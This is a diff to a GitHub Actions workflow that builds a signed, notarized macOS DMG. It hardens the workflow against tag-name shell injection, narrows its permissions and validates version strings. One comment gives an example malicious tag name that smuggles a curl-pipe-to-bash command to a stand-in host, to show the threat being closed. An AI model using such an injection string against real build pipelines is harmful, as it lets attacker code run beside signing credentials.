@@ -765,11 +765,26 @@ on:
       version:
         description: Version to stamp when running without a tag
         type: string
-        default: 0.0.0-dispatch
+        default: 0.0.0
 
+# Two notarization submissions racing, or two runs both writing the
+# `macos-dmg` artifact, is not something to discover on a release. Not
+# cancel-in-progress: killing a run mid-notarization leaves an Apple-side
+# submission with nothing watching it.
+concurrency:
+  group: release-apps-${{ github.ref }}
+  cancel-in-progress: false
+
+# attestations: write is REQUIRED by actions/attest-build-provenance, and its
+# absence fails late and expensively -- the attest step 403s only after the
+# full build/sign/notarize/staple, and since upload-artifact runs after it, the
+# signed DMG is discarded too. `contents: write` is deliberately NOT here: no
+# job in this workflow writes repository contents until the publish job exists,
+# and an unused write scope is reachable by every step of a job that holds a
+# signing key.
 permissions:
-  contents: write
   id-token: write
+  attestations: write
 
 jobs:
   version:
@@ -780,21 +795,60 @@ jobs:
       short: ${{ steps.v.outputs.short }}
       build: ${{ steps.v.outputs.build }}
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
-        with:
-          fetch-depth: 0
-      # CFBundleVersion must increase monotonically across releases;
-      # the commit count is monotonic and needs no external state.
+      # No checkout: nothing here reads the repository any more.
+      #
+      # CFBundleVersion must increase monotonically across releases, and the
+      # commit count does NOT satisfy that. It is a property of the branch you
+      # tagged, not of time: main at 100 commits, a release branch adds 5 and
+      # is tagged (build 105), the branch is squash-merged leaving main at 101,
+      # the next tag on main is build 101 -- LOWER than the release before it.
+      # macOS and every Sparkle-style comparison then read the newer release as
+      # an older build and refuse the upgrade. Any rebase or history rewrite
+      # does the same. Measured in this repo on 2026-08-16: this branch 958,
+      # origin/main 945, an unrelated stale branch 963.
+      #
+      # github.run_number is monotonic per workflow and independent of history
+      # shape. CAVEAT worth knowing rather than rediscovering: deleting and
+      # recreating this workflow file resets it, so never do that without
+      # adding an offset here.
       - id: v
+        env:
+          # Every one of these crosses into the shell through env, never
+          # through ${{ }} interpolation in the script body. A tag name may
+          # legally contain ';', '|', '$' and backticks, so interpolating it
+          # into a `run:` body is a shell-injection path -- and the job it
+          # would execute in holds an unlocked signing keychain and the notary
+          # key on disk.
+          EVENT_NAME: ${{ github.event_name }}
+          REF_NAME: ${{ github.ref_name }}
+          INPUT_VERSION: ${{ inputs.version }}
+          RUN_NUMBER: ${{ github.run_number }}
         run: |
           set -euo pipefail
-          if [ "${GITHUB_REF_TYPE}" = "tag" ]; then
-            SHORT="${GITHUB_REF_NAME#app-v}"
+          # Discriminate on the EVENT, not the ref type: a workflow_dispatch
+          # aimed at a tag ref would otherwise silently ignore the version the
+          # operator typed.
+          if [ "$EVENT_NAME" = "push" ]; then
+            SHORT="${REF_NAME#app-v}"
           else
-            SHORT="${{ inputs.version }}"
+            SHORT="$INPUT_VERSION"
           fi
+
+          # Validate here, where it costs five seconds, rather than after an
+          # hour of notarization. The `app-v*` trigger matches plenty of tags
+          # the prefix strip handles badly -- `app-vRC1` yields `RC1`,
+          # `app-versioning-notes` yields `ersioning-notes`, and refs may
+          # contain slashes, so `app-v1.0/hotfix` would produce a DMG path
+          # that does not exist and fail the copy AFTER notarization is paid
+          # for. Apple also specifies CFBundleShortVersionString as numeric.
+          if ! printf '%s' "$SHORT" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "refusing to release: '$SHORT' is not a three-part numeric version." >&2
+            echo "Tags must look like app-v1.2.3; a dispatch must pass the same shape." >&2
+            exit 1
+          fi
+
           echo "short=$SHORT" >> "$GITHUB_OUTPUT"
-          echo "build=$(git rev-list --count HEAD)" >> "$GITHUB_OUTPUT"
+          echo "build=$RUN_NUMBER" >> "$GITHUB_OUTPUT"
 
   macos:
     name: macOS signed DMG
@@ -821,8 +875,20 @@ jobs:
       # make-release-dmg.sh refuses outright when any credential is missing,
       # rather than falling back to an ad-hoc signature. An unsigned artifact
       # named like a release is worse than no artifact.
+      # The version crosses into the shell through env, NEVER through ${{ }}
+      # interpolation in the script body. GitHub substitutes an interpolation
+      # textually before bash sees it, and this job is the worst possible place
+      # for that: it holds an unlocked signing keychain and the notary key on
+      # disk. The version derives from a tag name, and refs legally contain
+      # ';', '|', '$', backticks and quotes -- only space, '~', '^', ':', '?',
+      # '*', '[' and '\' are barred -- so a tag named
+      # `app-v1.0.0;curl -s evil.sh|bash` would run attacker code beside the
+      # signing key. The version job's regex gate is the primary defence; this
+      # is the one that does not depend on the gate being right.
       - name: Build, sign, notarize and staple
         env:
+          SHORT_VERSION: ${{ needs.version.outputs.short }}
+          BUILD_VERSION: ${{ needs.version.outputs.build }}
           MACOS_CERTIFICATE_P12_BASE64: ${{ secrets.MACOS_CERTIFICATE_P12_BASE64 }}
           MACOS_CERTIFICATE_PASSWORD: ${{ secrets.MACOS_CERTIFICATE_PASSWORD }}
           MACOS_SIGNING_IDENTITY: ${{ secrets.MACOS_SIGNING_IDENTITY }}
@@ -830,15 +896,15 @@ jobs:
           MACOS_NOTARY_ASC_KEY_ID: ${{ secrets.MACOS_NOTARY_ASC_KEY_ID }}
           MACOS_NOTARY_ASC_ISSUER_ID: ${{ secrets.MACOS_NOTARY_ASC_ISSUER_ID }}
         run: |
-          ./macos/scripts/make-release-dmg.sh \
-            "${{ needs.version.outputs.short }}" \
-            "${{ needs.version.outputs.build }}"
+          ./macos/scripts/make-release-dmg.sh "$SHORT_VERSION" "$BUILD_VERSION"
 
       - name: Rename and checksum
+        env:
+          SHORT_VERSION: ${{ needs.version.outputs.short }}
         run: |
           set -euo pipefail
           mkdir -p dist
-          OUT="TraceCommons-${{ needs.version.outputs.short }}.dmg"
+          OUT="TraceCommons-${SHORT_VERSION}.dmg"
           cp macos/.build/TraceCommons.dmg "dist/$OUT"
           # The DMG is signed, notarized and stapled by this point, so this
           # checksum already covers the final bytes -- unlike the Windows and
@@ -847,10 +913,15 @@ jobs:
           ( cd dist && shasum -a 256 "$OUT" > "$OUT.sha256" )
 
       # After signing and stapling, so the provenance covers the bytes a
-      # contributor actually downloads.
+      # contributor actually downloads. The .sha256 is attested too: it is
+      # published beside the DMG as an integrity claim, and an unattested
+      # checksum file could be swapped independently of the artifact it
+      # describes.
       - uses: actions/attest-build-provenance@a2bbfa25375fe432b6a289bc6b6cd05ecd0c4c32 # v4
         with:
-          subject-path: dist/*.dmg
+          subject-path: |
+            dist/*.dmg
+            dist/*.dmg.sha256
 
       - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
         with:
